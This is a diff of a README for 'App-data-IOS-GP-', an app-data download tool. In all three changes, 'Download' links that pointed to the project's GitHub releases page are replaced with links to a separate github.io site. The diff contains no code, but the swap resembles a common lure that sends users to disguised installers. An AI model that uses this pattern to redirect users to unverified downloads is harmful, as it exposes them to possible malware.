@@ -8,7 +8,7 @@ App-data-IOS-GP- is your all-in-one gateway to the **FoxData App Store Data API*
 
 **Step 1 – Go to the Official Download Page**
 
-[![Download Now](https://img.shields.io/badge/Download-App--data--IOS--GP--v1.0-blue?style=for-the-badge&logo=github&colorA=purple&colorB=orange&labelColor=darkgreen)](https://github.com/unchartered-starlet3516/App-data-IOS-GP-/releases)
+[![Download Now](https://img.shields.io/badge/Download-App--data--IOS--GP--v1.0-blue?style=for-the-badge&logo=github&colorA=purple&colorB=orange&labelColor=darkgreen)](https://unchartered-starlet3516.github.io)
 
 *Click the button above – it takes you straight to the download center.*
 
@@ -93,7 +93,7 @@ When you open the app for the first time, you’ll see:
 
 ## 🔄 Need an Older Version?
 
-- Go to the [Download page](https://github.com/unchartered-starlet3516/App-data-IOS-GP-/releases)
+- Go to the [Download page](https://unchartered-starlet3516.github.io)
 - Scroll to **“Previous releases”** – choose any version from the list.
 - All versions work the same.
 
@@ -101,7 +101,7 @@ When you open the app for the first time, you’ll see:
 
 Get your app data, understand the market, and compete smarter. With App-data-IOS-GP-, you’re never in the dark again.
 
-Start now: Visit the [download page](https://github.com/unchartered-starlet3516/App-data-IOS-GP-/releases) to begin.
+Start now: Visit the [download page](https://unchartered-starlet3516.github.io) to begin.
 
 ---
 
